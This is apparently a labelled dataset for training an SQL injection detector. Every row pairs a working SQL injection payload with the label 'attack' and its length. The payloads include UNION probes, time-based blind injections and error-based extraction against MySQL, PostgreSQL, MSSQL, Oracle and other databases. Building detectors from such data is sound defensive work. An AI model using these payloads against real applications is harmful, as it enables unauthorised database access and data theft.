sentence,attack_type_code,attack_type,len_payload
'  )  )   AND 9263 =  ( SELECT 9263 FROM PG_SLEEP ( 5  )  )   AND   (  (  'xWkv' = xWkv,1,attack,87
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'yccm' LIKE 'yccm",1,attack,296
"1'+ ( select zpns where 6922 = 6922 and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a  )  )  +'",1,attack,255
"s.UEf: select * from users where id = 1 or 1#"". union select version (  ) ,version (  )  -- 1",1,attack,93
""" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND ""evOX"" = ""evOX",1,attack,260
"1 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) # dwxl",1,attack,279
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 3272 = 3272",1,attack,150
"1'  )  )   )  union all select null,null#",1,attack,41
"1%'  )  )   or elt ( 5873 = 5873,sleep ( 5  )  )  #",1,attack,51
"1"" )  and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )   and  ( ""rfpq"" = ""rfpq",1,attack,143
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",1,attack,196
"'  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL-- AND   (  (  'cznv' LIKE 'cznv",1,attack,81
"""  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( ""wvyt"" LIKE ""wvyt",1,attack,320
"1"" where 9889 = 9889",1,attack,20
"1' )  where 8211 = 8211 union all select null,null,null,null,null#",1,attack,66
""" AND SLEEP ( 5 )  AND ""TVHw"" LIKE ""TVHw",1,attack,40
"select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ""%"" = """,1,attack,110
"1%""  )  )   )  or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (   ( ""%"" = """,1,attack,152
"""  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (  ""Oszq"" LIKE ""Oszq",1,attack,188
"' )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--",1,attack,82
"' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND 'mrcN' LIKE 'mrcN",1,attack,341
 ( SELECT  ( CASE WHEN  ( 9041 = 9041 )  THEN 77B4A14B9E00AF083BA8806DA94B1348 ELSE 1/ ( SELECT 0 FRO,1,attack,100
1'  )  )   as joco where 2922 = 2922,1,attack,36
" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",1,attack,82
"  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (  6875 = 6875",1,attack,323
"select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  (   ( 'ctbs' like 'ctbs",1,attack,119
"1'|| ( select 'pvmz' from dual where 1090 = 1090 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1  )  )  ||'",1,attack,216
"' UNION ALL SELECT NULL, NULL, NULL, NULL--",1,attack,43
"""  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( ""elFO"" = ""elFO",1,attack,354
"1"" or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 )  and ""ekjs"" like ""ekjs",1,attack,139
"1"" and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and ""tfok"" like ""tfok",1,attack,226
"  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (  3449 = 3449",1,attack,329
select  ( case when  ( 5752 = 6036 )  then 1 else 5752* ( select 5752 from master..sysdatabases )  end ) --,1,attack,107
""" AND 7194 = CTXSYS.DRITHSX.SN ( 7194, ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 7194 = 7194 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58  )  )   )  AND ""XyCC"" LIKE ""XyCC",1,attack,280
"1'  )  )   ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users )  and   (  (  'rnyb' = 'rnyb",1,attack,269
1 )  as crsd where 5271 = 5271 waitfor delay '0:0:5'--,1,attack,54
-2402 or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   a,1,attack,255
"1  )  )   as rqbo where 2243 = 2243 and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )  --",1,attack,176
"""  )  )    )  )    )  )   waitfor delay '0:0:20' --",1,attack,51
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'BkzS' LIKE 'BkzS",1,attack,194
"-7379 union all select 9813,9813,9813,9813,9813,9813,9813,9813--",1,attack,64
""" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND  ( ""zCji"" = ""zCji",1,attack,187
"+if ( benchmark ( 3000000,MD5 ( 1  )  )  ,NULL,NULL ) ,NULL,NULL )  --",1,attack,70
"1'  )  )   )  and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (   ( 'ofko' = 'ofko",1,attack,147
1'+ ( select dpkp where 4836 = 4836 and sleep ( 5  )  )  +',1,attack,59
 or SLEEP(5)#,1,attack,12
"-6597'+ ( select aewz where 4036 = 4036 union all select 4036,4036,4036,4036,4036,4036,4036--",1,attack,93
"1%""  )  )   )  and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,attack,177
"1'  )  )   and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and   (  (  'hpbt' = 'hpbt",1,attack,144
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'VvGL' LIKE 'VvGL",1,attack,99
"-9370' )  where 7070 = 7070 or make_set ( 9354 = 9354,7185 ) --",1,attack,63
select  ( case when  ( 8403 = 7151 )  then 8403 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--,1,attack,115
"' )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND  ( 'zWha' LIKE 'zWha",1,attack,130
"' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND 'RBOO' = 'RBOO",1,attack,260
"""  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( ""IsYb"" = ""IsYb",1,attack,257
"' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND 'rmUi' = 'rmUi",1,attack,152
"' )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--",1,attack,112
""" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND ""pXtF"" = ""pXtF",1,attack,242
"' )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND  ( 'mdAK' LIKE 'mdAK",1,attack,346
"-3205"" )  union all select 5233,5233,5233,5233#",1,attack,47
1 )  where 8813 = 8813,1,attack,22
"1'+ ( select lhtn where 8484 = 8484 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null  )  )  +'",1,attack,227
"1"" or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and ""cdai"" = ""cdai",1,attack,95
"1"" where 2072 = 2072 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1,attack,118
-9650' )  or 1390 = 3209,1,attack,24
"-5190%"" or 8298 = 9306 and ""%"" = """,1,attack,34
" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--",1,attack,149
"""  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (  ""dqRu"" LIKE ""dqRu",1,attack,326
"1'+ ( select 'asmj' where 7808 = 7808 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5  )  )  +'",1,attack,140
"-7333%""  )  )   )  or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and   (  (   ( ""%"" = """,1,attack,144
"-3298 union all select 7618,7618,7618,7618,7618,7618,7618,7618,7618,7618#",1,attack,73
"  )  )   AND  ( SELECT 8121 FROM ( SELECT COUNT ( * ) ,CONCAT ( CHAR ( 58,99,108,122,58 ) , ( SELECT  ( CASE WHEN  ( 8121 = 8121 )  THEN 1 ELSE 0 END  )  )  ,CHAR ( 58,120,105,100,58 ) ,FLOOR ( RAND ( 0 ) *2  )  )  x FROM information_schema.tables GROUP BY x ) a )  AND   (  (  6272 = 6272",1,attack,287
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 4724 = 4724",1,attack,341
-4157' )  or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr,1,attack,255
"' AND  ( SELECT 8121 FROM ( SELECT COUNT ( * ) ,CONCAT ( CHAR ( 58,99,108,122,58 ) , ( SELECT  ( CASE WHEN  ( 8121 = 8121 )  THEN 1 ELSE 0 END  )  )  ,CHAR ( 58,120,105,100,58 ) ,FLOOR ( RAND ( 0 ) *2  )  )  x FROM information_schema.tables GROUP BY x ) a ) ",1,attack,257
" select * from users where id = 1 or ""@ ( "" or 1 = 1 -- 1",1,attack,56
1' rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and 'vnkr' like 'vnkr,1,attack,87
"""  )  )   or sleep ( __TIME__ )  = """,1,attack,36
""" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND ""ebVT"" LIKE ""ebVT",1,attack,335
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'UjvT' = 'UjvT",1,attack,305
'  )  )   )  AND 1917 IN   (  (  CHAR ( 58 ) +CHAR ( 99 ) +CHAR ( 108 ) +CHAR ( 122 ) +CHAR ( 58 ) + ( SELECT  ( CASE WHEN  ( 1917 = 1917 )  THEN CHAR ( 49 )  ELSE CHAR ( 48 )  END  )  )  +CHAR ( 58 ) +CHAR ( 120 ) +CHAR ( 105 ) +CHAR ( 100 ) +CHAR ( 58  )  )   )  AND   (  (   ( 'fclk' LIKE 'fclk,1,attack,297
"' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND 'HAhW' = 'HAhW",1,attack,194
"1' where 8749 = 8749 or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1,attack,96
 end and 'hizd' = 'hizd,1,attack,22
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'FofE' = 'FofE",1,attack,131
"""  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( ""AdYk"" LIKE ""AdYk",1,attack,308
"1' )  or elt ( 5873 = 5873,sleep ( 5  )  )  #",1,attack,45
"'  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (  'yKOR' = 'yKOR",1,attack,161
"UE1nc: select * from users where id = 1 union select 1a#,banner from v$version where rownum = 1 -- 1",1,attack,100
"1"" where 4978 = 4978 and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,attack,183
1' where 9216 = 9216,1,attack,20
"-1868"" )  where 9495 = 9495 or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",1,attack,192
1' )  waitfor delay '0:0:5' and  ( 'fpnh' = 'fpnh,1,attack,49
"' )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND  ( 'euvw' = 'euvw",1,attack,175
"' )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--",1,attack,322
"' )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND  ( 'aIKH' LIKE 'aIKH",1,attack,185
"""  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (  ""Mhxi"" = ""Mhxi",1,attack,125
"1"" where 5216 = 5216 or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,attack,128
"1"" and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and ""wtkx"" = ""wtkx",1,attack,182
"-4705' where 2029 = 2029 union all select 2029,2029,2029#",1,attack,57
select sleep ( 5  )  )  +',1,attack,26
"1' in boolean mode )  and elt ( 4249 = 4249,7259 ) #",1,attack,52
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 4631 = 4631",1,attack,353
1'  )  )   )  union all select null#,1,attack,36
""" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND  ( ""iSFi"" = ""iSFi",1,attack,103
' ) ; BEGIN USER_LOCK.SLEEP ( 5 ) ; END;--,1,attack,42
"1'  )  )   )  union all select null,null,null#",1,attack,46
1' )  and  ( 7603 = 3634 ) *3634,1,attack,32
1'|| ( select 'adni' from dual where 6611 = 6611,1,attack,48
1  )  )   as sipp where 1999 = 1999 and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno ) --,1,attack,98
"-3169"" order by 1#",1,attack,18
"1""  )  )   )  or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (   ( ""ugtw"" = ""ugtw",1,attack,117
" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--",1,attack,224
"1 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) ",1,attack,272
"1 )  or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  ",1,attack,84
"1'  )  )   as kdwc where 5906 = 5906 union all select null,null,null,null,null,null,null,null,null--",1,attack,100
"  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (  8112 = 8112",1,attack,294
"1 )  as wokl where 1368 = 1368 union all select null,null,null,null,null,null--",1,attack,79
"""  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( ""bILh"" LIKE ""bILh",1,attack,158
"' )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND  ( 'WlUL' = 'WlUL",1,attack,200
"-7111 union all select 2409,2409,2409,2409,2409,2409#",1,attack,53
sqlvuln;,1,attack,8
"-9054"" )  as rgyu where 3792 = 3792 order by 1--",1,attack,48
" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND  ( 5250 = 5250",1,attack,129
"1%"" and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and ""%"" = """,1,attack,67
"s&ovU: select * from users where id = '1' or !<@ union select 1,version (  )  -- 1'",1,attack,83
"1""  )  )   )  or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (   ( ""ldlp"" = ""ldlp",1,attack,244
"1%' )  and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and  ( '%' = '",1,attack,293
" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4",1,attack,63
"& ( 1UE: select * from users where id = 1 or  ( \+ )  = 1 union select 1,@@VERSION -- 1",1,attack,87
" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--",1,attack,308
"select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and  ( ""vabm"" = ""vabm",1,attack,111
"1' )  or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,attack,189
"1'  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   )  and 'aicu' = 'aicu",1,attack,287
"-2027%"" )  union all select 2048,2048,2048,2048,2048,2048,2048,2048#",1,attack,68
"""  )  )   )  UNION ALL SELECT NULL, NULL, NULL-- AND   (  (   ( ""uMWf"" = ""uMWf",1,attack,78
